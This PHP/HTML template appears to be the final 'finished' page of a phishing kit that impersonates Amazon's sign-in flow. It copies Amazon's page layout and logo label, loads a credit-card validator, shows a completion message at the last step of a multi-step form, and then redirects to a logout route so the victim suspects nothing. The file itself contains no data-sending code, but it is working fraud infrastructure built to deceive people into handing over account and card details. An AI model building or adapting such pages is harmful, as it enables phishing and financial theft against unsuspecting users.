<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">
                    <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                        <li>
                            <?php echo $_113 ?>
                        </li>
                        <li>
                            <?php echo $_46 ?>
                        </li>
                        <li>
                            <?php echo $_47 ?>
                        </li>
                        <li class="is-active">
                            <?php echo $_48 ?>
                        </li>
                    </ul>
                    <div class="cc-content6" style="padding-top: 0">
                        <div class="container">
                            <div align="center"> <img src="<?= base_url() ?>CR51/Assets/_hayo/images/finish.png" width="150"> </div>
                            <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_110 ?></span> </div>
                            <div align="center"> <span class="lefttext"><?php echo $_111 ?></span> </div>
                            <div align="center"> <span class="lefttext"><?php echo $_112 ?></span> </div>
                        </div>
                    </div>
                </div>
                <div class="a-section a-spacing-top-extra-large auth-footer">
                    <div class="a-divider a-divider-section">
                        <div class="a-divider-inner"></div>
                    </div>
                    <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                        <a class="a-link-normal">
                            <?php echo $_21 ?>
                        </a> <span class="auth-footer-seperator"></span>
                        <a class="a-link-normal">
                            <?php echo $_22 ?>
                        </a> <span class="auth-footer-seperator"></span>
                        <a class="a-link-normal">
                            <?php echo $_23 ?>
                        </a> <span class="auth-footer-seperator"></span>
                    </div>
                    <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
                </div>
            </div>
            <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery-3.3.1.min.js"></script>
            <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.mask.min.js"></script>
            <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.validate.min.js"></script>
            <script src="<?= base_url() ?>CR51/Assets/_hayo/js/additional-methods.min.js"></script>
            <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.creditCardValidator.js"></script>
            <script>
                let load;

                let _loader = () => {
                    load = setTimeout(showPage, 1000);
                }

                let showPage = () => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('myDiv').style.display = 'block';
                }

                let timer = setTimeout(function() {
                    window.location = "<?= base_url() ?>finished/logout"
                }, 5250);
            </script>
</body>

</html>